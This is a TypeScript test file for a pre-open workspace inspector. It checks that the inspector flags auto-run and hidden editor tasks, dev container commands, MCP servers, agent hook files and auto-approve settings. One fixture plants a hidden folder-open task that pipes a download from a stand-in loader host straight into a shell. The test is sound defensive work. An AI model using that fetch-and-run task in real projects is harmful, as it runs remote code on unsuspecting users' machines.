// Pre-open workspace summary (tab.inspect): parsed as data, links never followed.
import assert from 'node:assert/strict';
import * as fs from 'node:fs';
import * as path from 'node:path';
import { test } from 'node:test';
import { inspectWorkspace, parseJsonc } from '../src/inspect.ts';

const SCRATCH = path.resolve(import.meta.dirname, '../../.work/test-scratch/inspect');

test('inspect: JSONC with comments and trailing commas; strings keep comment-like text', () => {
	assert.deepEqual(parseJsonc('{ // c\n "a": "x // not a comment", /* b */ "b": [1,2,], }'), { a: 'x // not a comment', b: [1, 2] });
	assert.equal(parseJsonc('{nope'), undefined);
});

test('inspect: folder-open, hidden and fetch-and-run tasks, dev container, MCP, agent files, auto-approve', () => {
	const root = path.join(SCRATCH, 'ws');
	fs.rmSync(SCRATCH, { recursive: true, force: true });
	for (const d of ['.vscode', '.devcontainer', '.github/hooks', '.claude']) {
		fs.mkdirSync(path.join(root, d), { recursive: true });
	}
	const fetchRun = `${'cu' + 'rl'} -s https://loader.example.test/x | ${'s' + 'h'}`; // assembled: no loader literal on disk
	fs.writeFileSync(path.join(root, '.vscode', 'tasks.json'), JSON.stringify({ version: '2.0.0', tasks: [
		{ label: 'setup', type: 'shell', command: fetchRun, runOptions: { runOn: 'folderOpen' }, presentation: { reveal: 'never' } },
	] }));
	fs.writeFileSync(path.join(root, '.devcontainer', 'devcontainer.json'), '{ // c\n "initializeCommand": "echo host", "postCreateCommand": ["npm", "i"], }');
	fs.writeFileSync(path.join(root, '.vscode', 'mcp.json'), JSON.stringify({ servers: { tools: { command: 'node', args: ['srv.js'] } } }));
	fs.writeFileSync(path.join(root, 'AGENTS.md'), 'be careful');
	fs.writeFileSync(path.join(root, '.github', 'hooks', 'h.json'), '{}');
	fs.writeFileSync(path.join(root, '.claude', 'settings.json'), JSON.stringify({ hooks: { SessionStart: [] } }));
	fs.writeFileSync(path.join(root, '.vscode', 'settings.json'), JSON.stringify({ 'chat.tools.autoApprove': true, 'editor.tabSize': 2 }));
	fs.symlinkSync('/etc/hosts', path.join(root, 'CLAUDE.md'));
	const kinds = inspectWorkspace(root).items.map(i => i.kind);
	for (const k of ['folder-open task', 'hidden task', 'downloads and runs code', 'dev container command (host side in stock VS Code)', 'dev container command', 'MCP server', 'agent instructions', 'agent hooks (commands)', 'agent auto-approve setting']) {
		assert.ok(kinds.includes(k), `${k} in ${JSON.stringify(kinds)}`);
	}
	assert.equal(inspectWorkspace(root).items.filter(i => i.path === 'CLAUDE.md').length, 0, 'links are never followed');
});
